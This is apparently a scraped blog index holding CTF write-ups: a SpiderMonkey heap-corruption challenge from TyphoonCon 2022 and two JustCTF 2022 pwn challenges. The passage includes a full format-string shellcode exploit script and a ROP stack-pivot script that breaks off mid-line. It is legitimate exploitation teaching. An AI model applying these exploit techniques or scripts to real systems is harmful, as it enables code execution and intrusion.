build_NODBG.OBJ cd build_NODBG.OBJ ../configure --disable-debug --disable-optimize make Usually for browser pwn challenge, AFAIK, one of the attack vector is usually the js shell (which is for Firefox, it is powered with SpiderMonkey engine). This will build a binary called js under the dist/bin folder. Notes that we build the non-debug js shell. Analyzing the patch and source code After successfully build the binary, not it‚Äôs time for us to read the source code first. Let‚Äôs start by reading the patchfile. challenge.patch From 9b75f0de94978a681682cf13d392b0db7fa4161a Mon Sep 17 00:00:00 2001 From: Your Name \u003cyou@example.com\u003e Date: Thu, 17 Feb 2022 16:09:17 +0000 Subject: [PATCH] Cool new Implementation --- js/src/gc/Nursery.cpp | 4 +++- 1 file changed, 3 insertions(+), 1 deletion(-) diff --git a/js/src/gc/Nursery.cpp b/js/src/gc/Nursery.cpp index ef75e814ed..59ac8e5872 100644 --- a/js/src/gc/Nursery.cpp +++ b/js/src/gc/Nursery.cpp @@ -701,12 +701,14 @@ void* js::Nursery::reallocateBuffer(Zone* zone, Cell* cell, void* oldBuffer, return newBuffer; } + void* newBuffer = allocateBuffer(zone, newBytes); + // The nursery cannot make use of the returned slots data. if (newBytes \u003c oldBytes) { + position_ -= oldBytes; return oldBuffer; } - void* newBuffer = allocateBuffer(zone, newBytes); if (newBuffer) { PodCopy((uint8_t*)newBuffer, (uint8_t*)oldBuffer, oldBytes); } -- 2.20.1 Okay, so the patch is applied to the Nursery.cpp file. To understand it better, let‚Äôs try to read the method‚Äôs code. Nursery.cpp void* js::Nursery::reallocateBuffer(Zone* zone, Cell* cell, void* oldBuffer, size_t oldBytes, size_t newBytes) { if (!IsInsideNursery(cell)) { return zone-\u003epod_realloc\u003cuint8_t\u003e((uint8_t*)oldBuffer, oldBytes, newBytes); } if (!isInside(oldBuffer)) { MOZ_ASSERT(mallocedBufferBytes \u003e= oldBytes); void* newBuffer = zone-\u003epod_realloc\u003cuint8_t\u003e((uint8_t*)oldBuffer, oldBytes, newBytes); if (newBuffer) { if (oldBuffer != newBuffer) { MOZ_ALWAYS_TRUE( mallocedBuffers.rekeyAs(oldBuffer, newBuffer, newBuffer)); } mallocedBufferBytes -= oldBytes; mallocedBufferBytes += newBytes; } return newBuffer; } void* newBuffer = allocateBuffer(zone, newBytes); // The nursery cannot make use of the returned slots data. if (newBytes \u003c oldBytes) { position_ -= oldBytes; return oldBuffer; } if (newBuffer) { PodCopy((uint8_t*)newBuffer, (uint8_t*)oldBuffer, oldBytes); } return newBuffer; } Because I didn‚Äôt have context at all, let‚Äôs try to read the allocateBuffer method first to gain some context. void* js::Nursery::allocateBuffer(Zone* zone, size_t nbytes) { MOZ_ASSERT(nbytes \u003e 0); if (nbytes \u003c= MaxNurseryBufferSize) { void* buffer = allocate(nbytes); if (buffer) { return buffer; } } void* buffer = zone-\u003epod_malloc\u003cuint8_t\u003e(nbytes); if (buffer \u0026\u0026 !registerMallocedBuffer(buffer, nbytes)) { js_free(buffer); return nullptr; } return buffer; } Assuming that our allocated size is less than MaxNurseryBufferSize, that means allocateBuffer will call allocate method. Let‚Äôs check it out. inline void* js::Nursery::allocate(size_t size) { MOZ_ASSERT(isEnabled()); MOZ_ASSERT(!JS::RuntimeHeapIsBusy()); MOZ_ASSERT(CurrentThreadCanAccessRuntime(runtime())); MOZ_ASSERT_IF(currentChunk_ == currentStartChunk_, position() \u003e= currentStartPosition_); MOZ_ASSERT(position() % CellAlignBytes == 0); MOZ_ASSERT(size % CellAlignBytes == 0); #ifdef JS_GC_ZEAL if (gc-\u003ehasZealMode(ZealMode::CheckNursery)) { size += sizeof(Canary); } #endif if (MOZ_UNLIKELY(currentEnd() \u003c position() + size)) { return moveToNextChunkAndAllocate(size); } void* thing = (void*)position(); position_ = position() + ","date":"Jun 25, 2022","objectID":"/posts/typhooncon-ctf-2022/:1:1","tags":["Writeup","TyphoonCon","pwn","heap","firefox","SpiderMonkey","JIT","browser","oob","2022"],"title":"TyphoonCon CTF 2022","uri":"/posts/typhooncon-ctf-2022/"},{"categories":null,"content":"Exploitation Plan Now we know the bug, we need to know three things before we can actually exploit the bug: How to trigger allocateBuffer in Nursery What is the chunk metadata contents stored How to trigger reallocateBuffer in Nursery Understanding the SpiderMonkey engine Reading through this article will help us to answer the first and third question. To trigger it, we actually can just create a new array object. For example: a = new Array(0x7e) The above LOC will call allocateBuffer in the process. To understand it better, let‚Äôs fire up our gdb. Below is the script that I used to set the breakpoint. b *js::Nursery::allocate+128 b *js::Nursery::reallocateBuffer(JS::Zone*, js::gc::Cell*, void*, unsigned long, unsigned long)+643 The first breakpoint is pointing to the LOC position_ = position() + size; inside allocate The second is pointing to the LOC position_ -= oldBytes inside reallocateBuffer Now, try to initialize array like above, and lookup at the gdb. As you can see in the trace, it is true that creating an array array will call js::Nursery::allocate. The chunk address is the $rax value that you see in the above picture. Stepping through the gdb, turn out during constructing an array with size 0x7e, it will allocate 3 times with respective size 0x30, 0x400, and 0x20 (To understand why the allocation is like that, I recommend you to read this article which explain about it). Notes that these allocations size will varies based on your array size, which is why instead of calculating precisely, I‚Äôll just focus inspecting on the gdb layout. Let‚Äôs try to assign some value to our array. a[0]=0x1337 a[1]=2.4303e-320 // Double representation of 0x1337 hex a.x = 0xbeef a.y = 0x4141 Now, let‚Äôs inspect the chunk content now (start from the first one). gef‚û§ x/50gx 0x1010a1c00690 0x1010a1c00690: 0x00007ffff694e3f0 0x000010b870d60fe0 0x1010a1c006a0: 0x00001010a1c009d0 0x00001010a1c006d0 0x1010a1c006b0: 0x0000000000000000 0x0000007e00000000 0x1010a1c006c0: 0x0000000200000000 0x0000007e00000005 0x1010a1c006d0: 0xfff8800000001337 0x0000000000001337 0x1010a1c006e0: 0x0000000000000000 0x0000000000000000 0x1010a1c006f0: 0x0000000000000000 0x0000000000000000 0x1010a1c00700: 0x0000000000000000 0x0000000000000000 0x1010a1c00710: 0x0000000000000000 0x0000000000000000 0x1010a1c00720: 0x0000000000000000 0x0000000000000000 0x1010a1c00730: 0x0000000000000000 0x0000000000000000 0x1010a1c00740: 0x0000000000000000 0x0000000000000000 0x1010a1c00750: 0x0000000000000000 0x0000000000000000 0x1010a1c00760: 0x0000000000000000 0x0000000000000000 0x1010a1c00770: 0x0000000000000000 0x0000000000000000 0x1010a1c00780: 0x0000000000000000 0x0000000000000000 0x1010a1c00790: 0x0000000000000000 0x0000000000000000 0x1010a1c007a0: 0x0000000000000000 0x0000000000000000 0x1010a1c007b0: 0x0000000000000000 0x0000000000000000 0x1010a1c007c0: 0x0000000000000000 0x0000000000000000 0x1010a1c007d0: 0x0000000000000000 0x0000000000000000 0x1010a1c007e0: 0x0000000000000000 0x0000000000000000 0x1010a1c007f0: 0x0000000000000000 0x0000000000000000 0x1010a1c00800: 0x0000000000000000 0x0000000000000000 0x1010a1c00810: 0x0000000000000000 0x0000000000000000 gef‚û§ x/20gx 0x00001010a1c009d0 0x1010a1c009d0: 0xfff880000000beef 0xfff8800000004141 0x1010a1c009e0: 0x0000000000000000 0x00007ffff694e3f2 0x1010a1c009f0: 0x0000000541410a50 0x0000003530373631 0x1010a1c00a00: 0x0000000000000000 0x00007ffff694e3f2 0x1010a1c00a10: 0x0000000413370a50 0x0000000039313934 0x1010a1c00a20: 0x0000000000000000 0x00007ffff694e3f2 0x1010a1c00a30: 0x0000000b00000250 0x2d65333033342e32 0x1010a1c00a40: 0x0000000000303233 0x0000000000000000 0x1010a1c00a50: 0x0000000000000000 0x0000000000000000 0x1010a1c00a60: 0x0000000000000000 0x0000000000000000 Some notable metadata that we can see: At address 0x1010a1c006a0, we can see that it stored a pointer to the start of our properties. At address 0x1010a1c006a8, we can see that it stored a pointer to the start of our array elements. At address 0x1010a1c006c0, it store the co","date":"Jun 25, 2022","objectID":"/posts/typhooncon-ctf-2022/:1:2","tags":["Writeup","TyphoonCon","pwn","heap","firefox","SpiderMonkey","JIT","browser","oob","2022"],"title":"TyphoonCon CTF 2022","uri":"/posts/typhooncon-ctf-2022/"},{"categories":null,"content":"Solution Below is the detailed step by step on how I craft my solution based on the final plan that I described before. Trigger Overlapping chunk Let‚Äôs restart our previous shell, and load this code: /* Sequence of operations to corrupt the Nursery Heap */ // NOTES: // - The size that I choose is based on trial-and-error inspecting the GDB // - Funny, but adding multiple line of comments also affect the nursery heap chunk layout. So I use inline comment to make sure my payload is working lol. a = new Array(0x7e) // This will initialize a-chunk inside the Nursery Heap. position_ (Nursery heap pointer to the first unallocated chunk) is still correct b = new Array(0x50) // This will add a new chunk (b-chunk) after the a-chunk position_ is still correct a.length = 0 // This will trigger reallocateBuffer (which is the bug). After this, the position_ is corrupted, where it is now pointing to around the middle of a-chunk b.fill(0) // Fill b to increase the array b total element count, so that later we can write a value to any of b array elements. c = new Array(0x50) // This will add a new chunk (c-chunk), which overlap a-chunk \u0026 b-chunk. position_ will point to around b-chunk c.length = 0x10 // This will trigger reallocateBuffer (which is the bug). After this, the position_ is corrupted, where it is now pointing to around the middle of b-chunk, specifically in the area of b-chunk array elements. d = new Array(0x20) // This will add a new chunk (d-chunk), which overlap b-chunk. Now, this d array metadata is actually overlapping with the b array elements. Hence, with b, we can overwrite the metadata stored for array d. d.fill(0) // Fill d to increase the array d total element count. // Assign 3 properties to d. This will be used during crafting addrof method d.x = 2.4303e-320; d.y = 2.4303e-320; d.z = 2.4303e-320; Based on trial and error and inspecting the gdb, the above payload will trigger the overlapping chunk bug, where with b, we can overwrite the d metadata that stored pointers to its properties and elements address. You can read the code comments for summary on why it create an overlapping chunks. So, inspecting via gdb, below is the current heap layout gef‚û§ x/50gx 0x1f4107200ae0 0x1f4107200ae0: 0x00007ffff6951ff0 0x00003afd8a760f40 0x1f4107200af0: 0x000055555700b9a8 0x00001f4107200b20 0x1f4107200b00: 0x0000000000000000 0x0000005000000000 0x1f4107200b10: 0x0000005000000000 0x0000005000000050 0x1f4107200b20: 0xfff8800000000000 0xfff8800000000000 0x1f4107200b30: 0xfff8800000000000 0xfff8800000000000 0x1f4107200b40: 0xfff8800000000000 0xfff8800000000000 0x1f4107200b50: 0xfff8800000000000 0xfff8800000000000 0x1f4107200b60: 0xfff8800000000000 0x0000000e00000000 0x1f4107200b70: 0x0000000e0000000e 0xfffb3afd8a761560 0x1f4107200b80: 0xfffb3afd8a761560 0xfffb3afd8a761560 0x1f4107200b90: 0xfffb3afd8a761560 0xfffb3afd8a761560 0x1f4107200ba0: 0xfffb3afd8a761560 0xfffb3afd8a761560 0x1f4107200bb0: 0xfffb3afd8a761560 0xfffb3afd8a761560 0x1f4107200bc0: 0xfffb3afd8a761560 0xfffb3afd8a761560 0x1f4107200bd0: 0xfffb3afd8a761560 0xfffb3afd8a761560 0x1f4107200be0: 0xfffb3afd8a761560 0x00007ffff6951ff0 0x1f4107200bf0: 0x00003afd8a765140 0x00001f4107200da0 0x1f4107200c00: 0x00001f4107200c28 0x0000000000000000 0x1f4107200c10: 0x0000002000000000 0x0000002000000000 0x1f4107200c20: 0x0000002000000020 0xfff8800000000000 0x1f4107200c30: 0xfff8800000000000 0xfff8800000000000 0x1f4107200c40: 0xfff8800000000000 0xfff8800000000000 0x1f4107200c50: 0xfff8800000000000 0xfff8800000000000 0x1f4107200c60: 0xfff8800000000000 0xfff8800000000000 gef‚û§ x/10gx 0x00001f4107200da0 0x1f4107200da0: 0x0000000000001337 0x0000000000001337 0x1f4107200db0: 0x0000000000001337 0x00007ffff6951ff2 0x1f4107200dc0: 0x0000000c00000250 0x3032373031346631 0x1f4107200dd0: 0x0000000038656130 0x00007ffff6951ff2 0x1f4107200de0: 0x0000000e00000250 0x3237303134663122 Notes: 0x1f4107200b20 is the starting of array B elements. 0x1f4107200bf8 is used by array D to store pointer to its properties (on","date":"Jun 25, 2022","objectID":"/posts/typhooncon-ctf-2022/:1:3","tags":["Writeup","TyphoonCon","pwn","heap","firefox","SpiderMonkey","JIT","browser","oob","2022"],"title":"TyphoonCon CTF 2022","uri":"/posts/typhooncon-ctf-2022/"},{"categories":null,"content":" During the weekend, I played this CTF together with my new team idek. We managed to secure 8th spot. Kudos to my team and the organizers for such a high quality CTF challenges. On this post, I‚Äôll explain my solution to the pwn challenges that I managed to solve during the CTF. Pwn ","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:0:0","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"arm This IoT solution will revolutionize the market! nc arm.nc.jctf.pro 5002 PS: there is a few minutes timeout for every connection. ","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:1:0","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a Dockerfile and a binary file called cli. Let‚Äôs check the given binary first Arch: aarch64-64-little RELRO: Full RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments Oh wow, Full RELRO. We can‚Äôt overwrite GOT table. NX disabled. Stack is executable. PIE enabled. That means we will need a leak. It‚Äôs an aarch64 file. My laptop use amd architecture, so I won‚Äôt be able to run the file directly. Let‚Äôs forget it for a while, and just disassemble the given binary first. main undefined8 main(void) { int iVar1; setvbuf(stdin,(char *)0x0,2,0); iVar1 = setvbuf(stdout,(char *)0x0,2,0); iVar1 = auth(iVar1); if (iVar1 == 0) { puts(\"Sorry.\"); } else { cli(); } return 0; } So this is the main method, it will call auth, and if we are authenticated, it will call cli. Let‚Äôs check auth function. auth undefined8 auth(void) { undefined *puVar1; int iVar2; size_t sVar3; char acStack32 [16]; char acStack16 [16]; puts(\"Turrbomower 65000FU\\n\"); printf(\"login: \"); read_bytes(acStack16,0xf); printf(\"password: \"); read_bytes(acStack32,0xf); puVar1 = user; sVar3 = strlen(user); iVar2 = strncmp(acStack16,puVar1,sVar3); puVar1 = pass; if (iVar2 == 0) { sVar3 = strlen(pass); iVar2 = strncmp(acStack32,puVar1,sVar3); if (iVar2 == 0) { return 1; } } return 0; } Oh well, the user and pass is stored lol. We can simply bypass this auth. Let‚Äôs move to the cli method then. cli void cli(void) { int iVar1; size_t __n; char cmd [5]; char acStack355 [251]; char echo_input [100]; int local_4; local_4 = 0; while( true ) { printf(\"\u003e \"); read_bytes(cmd,0x100); iVar1 = strncmp(cmd,\"exit\",4); if (iVar1 == 0) break; iVar1 = strncmp(cmd,\"echo\",4); if ((iVar1 == 0) \u0026\u0026 (local_4 == 1)) { __n = strlen(cmd); strncpy(echo_input,acStack355,__n); printf(echo_input); } else { iVar1 = strncmp(cmd,\"status\",6); if (iVar1 == 0) { system(\"uptime\"); } else { iVar1 = strncmp(cmd,\"mode\",4); if (iVar1 == 0) { iVar1 = strncmp(acStack355,\"advanced\",8); if (iVar1 == 0) { local_4 = 1; puts(\"advanced mode enabled\\n\"); } else { puts(\"unknown mode\"); } } else if (local_4 == 0) { puts(\"status - prints device status\\nexit - end cli session\"); } else { puts( \"status - prints device status\\necho \u003cstring\u003e - prints \u003cstring\u003e\\nexit - end cli sessio n\" ); } } } memset(cmd,0,0x100); } return; } Ah okay, we can notice that there is format string vuln in the echo feature. Also notes that to be able to use echo feature, we need to activated advanced mode first, which is simply send command mode advanced to the server, and no we are able to use the echo feature. Also another thing is it has its own read function called read_bytes. Let‚Äôs take a look on it. void read_bytes(char *param_1,int param_2) { char *local_18; int local_4; local_4 = 0; for (local_18 = param_1; (((local_4 != param_2 \u0026\u0026 (read(0,local_18,1), *local_18 != '\\n')) \u0026\u0026 (*local_18 != '\\0')) \u0026\u0026 (((*local_18 != '\\x1b' \u0026\u0026 (*local_18 != '\\xa8')) \u0026\u0026 (*local_18 != '\\x13')))); local_18 = local_18 + 1) { local_4 = local_4 + 1; } return; } Ah, so basically it will read our input one-by-one per char, and if it is one of the fourth terminating character, it‚Äôll stop reading our input. As we already understand how the binary works, now, let‚Äôs check the dockerfile # on host: docker run --rm --privileged multiarch/qemu-user-static --reset -p yes FROM arm64v8/ubuntu ENV DEBIAN_FRONTEND=noninteractive #RUN apt update \u0026\u0026 apt install gcc gdb git -yy #RUN git clone https://github.com/pwndbg/pwndbg \u0026\u0026 cd pwndbg \u0026\u0026 ./setup.sh #RUN pip3 install pwn RUN apt update \u0026\u0026 apt install socat gcc -yy RUN mkdir /pwn COPY cli /pwn/cli #COPY cli.c /pwn/cli.c #RUN gcc -D_FORTIFY_SOURCE=2 -fno-stack-protector -zexecstack -o /pwn/cli /pwn/cli.c \u0026\u0026 rm /pwn/cli.c COPY flag.txt /pwn/flag.txt COPY run.sh /pwn/run.sh RUN groupadd ctf \u0026\u0026 \\ useradd -G ctf --home=/pwn pwn # Helper/fixer for socat issues COPY socat-sigpipe-fixup /pwn/socat-sigpipe-fixup RUN chmod 111 /pwn/socat-sigpipe-fixup \u0026\u0026 \\ chmod 700 /pwn/run.sh CMD \"/pwn/run.sh\" Ok","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:1:1","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"Exploitation Plan Well, because NX is disabled, my final goal will be using the format string bug to put shellcode in the stack, and then pivot the stack so that it‚Äôll return to my shellcode. However, this is an arm binary, which is this is my first time seeing an arm binary. So, what I do is learning some basic arm instruction and general concept on how does it run. Basic info about arm64 binary Reading through the previous mentioned articles and this article from perfect blue team helps me a lot on understanding how an arm64 instructions works. First, let‚Äôs talk about the available registers. It has 31 main registers, ranging from x0 to x30. x29 is used to store the function frame pointer, while x30 is used to store the function return address. Because we want to abuse format string vuln, we need to learn also on how arm64 handled function arguments. The answer is it will use x0 - x7 as its args first, and will use the stack for the remaining args. Last, one of the unique thing that we need to know is, in arm64, when we call a function (via bl instruction), it will store the return address in x30 first. And then, the called function will preserve these values on top of the stack ([sp] and [sp+8]). So, this is difference with what x86_64 do, where it preserves those values on the bottom of the stack. See below example to see the usual setup of arm64 function. 00100bd0 fd 7b a7 a9 stp x29,x30,[sp, #-400]! 00100bd4 fd 03 00 91 mov x29,sp In the start of the function, it will subtract the current sp by 400, and then preserve the caller frame pointer (x29) and the return address (x30) to the top of the function stack. And then it will store the the new sp value in x29. Let see how ret does in arm64 0x4000000d50 \u003ccli+384\u003e ldp x29, x30, [sp], #400 0x4000000d54 \u003ccli+388\u003e ret It will restore the preserved frame pointer and return address from the stack back to x29 and x30, and then update sp value back to the caller function stack (sp-400). And then ret won‚Äôt pop a stack like x86_64, instead, it will jump to the value in x30 register. Rough Plan What we have gathered so far: The frame pointer and saved return address is stored in the top of the stack (which means we can access it with the format string bug) We can do the format string attack infinite times, as there is no limitation NX is disabled, so we can store shellcode in the stack Now it is clear, that my detailed plan: Leak main frame pointer with echo %8$p. We use 8 to get the top of the stack because in arm64, 1st - 7th param will be taken from the register (x1 - x7). After leaking it, set our target shellcode location. I choose to put it in the leaked_value - 0x3f0 And then, we put the shellcode per byte with format string bug. Rough payload will be echo %{shellcode_bytecode}c%16$hhn{padding}{shellcode_address}. The detailed can be found later And then, for the final step, we overwrite the preserved return address ([sp+8]) with the shellcode_address, so that when we exit from the cli function, it will jump to our shellcode inside the stack. ","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:1:2","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"Solution So, based on that plan, we need to craft our shellcode first. Notes that there are some restricted char, so make sure that our shellcode doesn‚Äôt contain the restricted char. Based on trial and error, we can‚Äôt use execve syscall because it contains \\x1b. One of my teammate suggest me to directly open-read-write the flag (kudos to Ka3l). Looking for the existing shellcode in google, I found a good shellcode, and modify it a little bit. And the shellcode doesn‚Äôt contain any restricted characters, so it should be fine. Below is the full script that I used to solve the problem: from pwn import * context.arch = 'aarch64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") # source: https://www.exploit-db.com/exploits/47053 shellcode = asm( \"\"\" // open \"/pwn/flag.txt\" mov x0, xzr mov x1, #0x2e67 movk x1, #0x7874, lsl #16 movk x1, #0x74, lsl #32 str x1, [sp, #-8]! mov x1, #0x702f movk x1, #0x6e77, lsl #16 movk x1, #0x662f, lsl #32 movk x1, #0x616c, lsl #48 str x1, [sp, #-8]! add x1, sp, x0 mov x2, xzr mov x8, #56 svc #0x1337 mvn x3, x0 // read(fd, *buf, size) mov x2, #0xfff sub sp, sp, x2 mov x8, xzr add x1, sp, x8 mov x8, #63 svc #0x1337 // write(1, *buf, size) str x0, [sp, #-8]! lsr x0, x2, #11 ldr x2, [sp], #8 mov x8, #64 svc #0x1337 \"\"\" ) def conn(): if args.LOCAL: r = process(['qemu-aarch64', './cli_patched'], env={}) if args.PLT_DEBUG: r = process(['qemu-aarch64','-g', '9000', './cli_patched'], env={}) else: r = remote('arm.nc.jctf.pro', 5002) return r r = conn() # Login (credential retrieved from the binary in .data section) r.sendlineafter(b'login: ', b'admin') r.sendlineafter(b'password: ', b'admin1') # Activate mode advanced, so that we can use echo r.sendlineafter(b'\u003e ', b'mode advanced') # Leak main frame pointer r.sendlineafter(b'\u003e ', b'echo %8$p') main_x29 = int(r.recvline().strip(), 16) # Set any stack address to put our shellcode shellcode_stack_addr = main_x29 - 0x3f0 log.info(f'Shellcode stack address: {hex(shellcode_stack_addr)}') # Put it in stack per byte for i in range(0, len(shellcode)): value = shellcode[i] target = p64(shellcode_stack_addr+i) if value == 0: f'echo %15$hhnaaaa'.encode()+target else: payload = f'echo %{value}c%16$hhn'.encode() payload += b'a'*(24-len(payload)) # pad so that payload is 8-bytes aligned payload += target # Make sure that payload is bypassing the restriction if b'\\n' in payload or b'\\x1b' in payload or b'\\x13' in payload or b'\\xa8' in payload: log.info(f'Invalid payload') exit() log.info('-----') log.info(f'Payload: {payload}') r.sendlineafter(b'\u003e ', payload) log.info(f'Finished setting up shellcode...') # The preserved saved return pointer x30_ret_addr = main_x29-400+8 log.info(f'Main x30 (Return address): {hex(x30_ret_addr)}') # I don't know why, but somehow I can't overwrite x30_ret_addr+0 directly # So, during sending my exploit in remote, I overwrite the preserved saved return # address to our shellcode in stack with this order: # - x30_ret_addr+1: Overwrite 1 byte # - x30_ret_addr+2: Overwrite 1 byte # - x30_ret_addr+3: Overwrite 1 byte # - x30_ret_addr+4: Overwrite 1 byte # - x30_ret_addr-1: Overwrite 2 byte, so that x30_ret_addr+0 will be overwritten for i, byt in enumerate(p64(shellcode_stack_addr)[:5]): if i == 0: continue print('i', i, hex(byt)) payload = f'echo %{byt}c%16$hhn'.encode() payload += b'a'*(24 - len(payload)) payload += p64(x30_ret_addr+i) log.info(f'Payload: {payload}') r.sendlineafter(b'\u003e ', payload) payload = f'echo %{p64(shellcode_stack_addr)[0] \u003c\u003c 8}c%16$hn'.encode() payload += b'a'*(24 - len(payload)) payload += p64(x30_ret_addr-1) print(f'Payload: {payload}', len(payload)) r.sendlineafter(b'\u003e ', payload) # Now, exit from cli function. And then it will return to our shellcode r.sendlineafter(b'\u003e ', b'exit') r.interactive() Result Flag: justCTF{pwn_the_lawn!1} ","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:1:3","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"Skilltest Test your skills in a random competition. nc skilltest.nc.jctf.pro 1337 ","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:2:0","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a binary file. Let‚Äôs try to checksec it first Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3fe000) RUNPATH: b'.' Okay, No PIE and Full RELRO. Now, let‚Äôs try to disassemble it (Notes that I‚Äôve renamed some of the function to understand it better). main undefined8 main(void) { undefined rand_struct [48]; setup_mprotect(); print_custom(\"Welcome to skilltest v12!\\n\"); memset(rand_struct,0,0x30); rand_func((astruct *)rand_struct); main_loop((astruct_1 *)(rand_struct + 0x18)); check_win((astruct_2 *)rand_struct); unsetup_mprotect(); return 0; } This is the main function, seems like no vuln in here. print_custom void print_custom(char *param_1) { size_t __n; __n = strlen(param_1); write(1,param_1,__n); return; } This will print given string. rand_func void rand_func(astruct *a_struct) { int iVar1; int iVar2; time_t tVar3; size_t sVar4; ulong idx; ulong jdx; tVar3 = time((time_t *)0x0); srand((uint)tVar3); iVar1 = rand(); iVar2 = rand(); a_struct-\u003efield0_0x0 = \"Amelie\" + (long)(iVar1 % 10) * 0x20; a_struct-\u003efield1_0x8 = \"Black\" + (long)(iVar2 % 5) * 0x60; a_struct-\u003efield2_0x10 = 0; jdx = 0; while( true ) { sVar4 = strlen(a_struct-\u003efield0_0x0); if (sVar4 \u003c= jdx) break; a_struct-\u003efield2_0x10 = a_struct-\u003efield2_0x10 + (int)a_struct-\u003efield0_0x0[jdx]; a_struct-\u003efield2_0x10 = a_struct-\u003efield2_0x10 % 0x1e; jdx = jdx + 1; } idx = 0; while( true ) { sVar4 = strlen(a_struct-\u003efield1_0x8); if (sVar4 \u003c= idx) break; a_struct-\u003efield2_0x10 = a_struct-\u003efield2_0x10 + (int)a_struct-\u003efield1_0x8[idx]; a_struct-\u003efield2_0x10 = a_struct-\u003efield2_0x10 % 0x1e; idx = idx + 1; } return; } So far, there isn‚Äôt any bug in here. main_loop void main_loop(astruct_1 *input_struct) { ssize_t sVar1; char *_res; size_t sVar2; char *nickname; void *clan_tag; ulong jdx; ulong idx; clan_tag = malloc(size_0x60); memset(\u0026nickname,0,size_0x20); memset(clan_tag,0,size_0x60); while( true ) { while( true ) { print_custom(\"Nick: \"); sVar1 = read(0,\u0026nickname,size_0x60); if (0 \u003c sVar1) break; print_custom(\"Invalid name, try again\\n\"); } print_custom(\"Clan tag: \"); sVar1 = read(0,clan_tag,size_0x60); if (0 \u003c sVar1) break; print_custom(\"Invalid color, try again\\n\"); } _res = (char *)FUN_00401389(\u0026nickname); _res = strdup(_res); input_struct-\u003enick_name = _res; _res = (char *)FUN_00401389(clan_tag); input_struct-\u003eclan_tag = _res; input_struct-\u003escore = 0; idx = 0; while (sVar2 = strlen(input_struct-\u003enick_name), idx \u003c sVar2) { input_struct-\u003escore = input_struct-\u003escore + (int)input_struct-\u003enick_name[idx]; input_struct-\u003escore = input_struct-\u003escore % 0x1e; idx = idx + 1; } jdx = 0; while (sVar2 = strlen(input_struct-\u003eclan_tag), jdx \u003c sVar2) { input_struct-\u003escore = input_struct-\u003escore + (int)input_struct-\u003eclan_tag[jdx]; input_struct-\u003escore = input_struct-\u003escore % 0x1e; jdx = jdx + 1; } print_custom(\"Thanks\\n\"); return; } At first, I didn‚Äôt notice a bug in here. But one of my teammate (kudos to pivik, also pivik is the one who solve this chall and submit the flag first xD. But I decided to finish my solver script for the sake of learning and experience) said that there is a buffer overflow bug during inputting our nickname. I just realized that the nickname size is 0x20, but we can input up to 0x60. This will allow us to: Overwrite the clan_tag pointer Overwrite the function rbp Overwrite the function return address I checked the other function, and seems like there isn‚Äôt any bug. And I think this buffer overflow bug is enough for us to perform our exploitation. ","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:2:1","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"Exploitation Plan Using the above bug that we found, checking the memory mapping during running the binary, we can see that there is a static writeable region in offset 0x3fe000 - 0x400000. gef‚û§ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x000000003fe000 0x00000000400000 0x00000000000000 rw- So, based on that, my rough plan is: Pivot the stack to that region Overwrite the return address to its ownself, so that I can fill the new stack with my desired input Fill stack with my desired input, so that I can ROP it to leak libc, and then go back to the main_loop And after leaking libc, ROP to execve that we found with one_gadget. Notes that the one_gadget address that I used required r12 and r15 to be null, so I emptied it first with gadget that I found in the given libc. ","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:2:2","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"Solution Notes that during executing my plan, there are a lot of constraint and ad-hoc things that I need to do. I‚Äôve tried to add comments to my script to explain how did I pivot and ROP it, so that I can get a shell. You can read the comments in my script Below is the full script: from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") exe = ELF(\"./skilltest_patched\") libc = ELF(\"./libc-2.34.so\") context.binary = exe r = remote(b'skilltest.nc.jctf.pro', 1337) # r = process([exe.path]) # gdb.attach(r, gdbscript=''' # b *0x00000000004014a0 # b *0x00000000004014e0 # b *0x00401643 # ''') '''Preparation''' write_got = exe.got['write'] # We will leak the write libc address later pop_rdi = 0x00000000004018dc # pop rdi ; nop ; leave ; ret main_loop = 0x40147b # Main loop address (directly to instruction that ask \"Nick: \" input) main_loop_sub_rsp = 0x40142a # Main loop address (directly to instruction sub rsp, 0x50) write_custom = 0x004013ef # Write method defined in the binary (print_custom) w_addr = 0x3fe800 # Static writeable region found via vmmap. I decided to use this address, but I believe you can choose any address. ''' Constraint that we need to fulfill during each ROP to the main loop: - Everytime we loop to the main and pivot our rbp, rbp-0x48 must be in writeable region, because it will be used to store the strdup result ''' '''First Loop''' # The goal for this is to pivot RBP for our next main loop call to the static writeable region (w_addr) second_rbp = w_addr payload = b'a'*0x28 # Overwrite clan_tag address to second_rbp-0x48, so that we can ensure # second_rbp-0x48 is 